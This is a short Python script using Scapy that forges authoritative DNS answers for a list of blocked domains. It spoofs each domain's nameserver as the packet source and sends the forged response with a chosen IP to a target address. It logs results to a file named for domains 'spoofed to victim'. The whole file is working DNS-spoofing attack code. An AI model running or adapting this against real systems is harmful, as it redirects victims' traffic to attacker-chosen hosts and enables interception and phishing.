import sys
sys.path.insert(0, '/root')
from scapy.all import *


with open("send_spoofed_packet_here.txt",'r') as file:
	external_ip = file.read()

with open("transfer_to_us_blocked_domains_with_ns.txt",'r') as file:
	domains_raw=file.read().split("\n")
#array of tuples with domain, NS, IP
with open("active_domains_to_ip_mapping.txt",'r') as file:
	domain_ip_arr=file.read().split("\n")
domain_ip_map={}
for one_dom_ip in domain_ip_arr:
	if one_dom_ip=="":
		continue
	sep_arr=one_dom_ip.split(" ")
	arr_domain=sep_arr[0]
	arr_ip=sep_arr[1]
	arr_ip=arr_ip.replace(",","")
	domain_ip_map[arr_domain]=arr_ip
domains=[]


for one_domain in domains_raw:
	separate=one_domain.split(" ")
	if len(separate)>1:
		try:
			pass #print "hey"
			pass #print separate[0]
			pass #print domain_ip_map[separate[0]]
			a=IP(src=separate[1],dst=external_ip)/ UDP(sport=53,dport=43246)/DNS(id=0x6696,ancount=1,aa=1,an=DNSRR(rrname=separate[0],rdata=domain_ip_map[separate[0]]),qr=1L,qd=DNSQR(qname=separate[0]))
			pass #print "sending this ",a.show()
			ans=sr1(a,timeout=1,retry=3,verbose=1)
			pass #print "we got ",ans.show()
			with open("domains_spoofed_to_victim.txt",'a') as file:
				file.write(separate[0]+" "+separate[1]+" "+str(domain_ip_map[separate[0]])+"\n")
			
		except:
			pass #print "exception raised"
			pass

pass #print(domains_raw)
 

 
